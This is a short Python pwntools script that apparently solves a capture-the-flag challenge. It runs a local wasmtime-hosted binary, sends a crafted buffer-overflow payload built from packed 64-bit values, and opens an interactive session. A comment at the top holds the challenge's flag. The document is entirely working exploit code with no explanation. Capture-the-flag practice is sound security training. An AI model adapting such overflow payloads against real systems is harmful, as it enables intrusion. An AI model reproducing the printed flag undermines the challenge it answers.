# grey{s1mpl3_buff3r_0v3rfl0w_w4snt_1t?_r3m3mb3r_t0_r34d_th3_st0ryl1ne:)}

from pwn import *

io = process("/home/shin24/security/ctf/greyhat/Motorala/wasmtime/target/debug/wasmtime --dir=./ --config=./cache.toml ./chall".split(" "))
p64 = util.packing.p64
payload = p64(0)*7
payload += p64(0x1100000000)
payload += p64(0x18e0000018e0)
payload += p64(0x3200000010)
payload += p64(0x300012350)
payload += p64(0x0)*4
payload += p64(0x1300000000)
payload += p64(0x0)
payload += p64(0x48100000000)
payload += p64(0x1235800012358)
payload += p64(0x0)
payload += p64(0x4000019e8)
payload += p64(0x300000000)
payload += p64(0x100000002)
payload += p64(0x400000123d8)
payload += p64(0x0)
payload += p64(0xffffffff00000004)
payload += p64(0xffffffff)
payload += p64(0x0)*134
payload += p64(0x5200000480)
payload += p64(0x41)

io.sendline(payload)
io.sendline(b"A")
io.interactive()
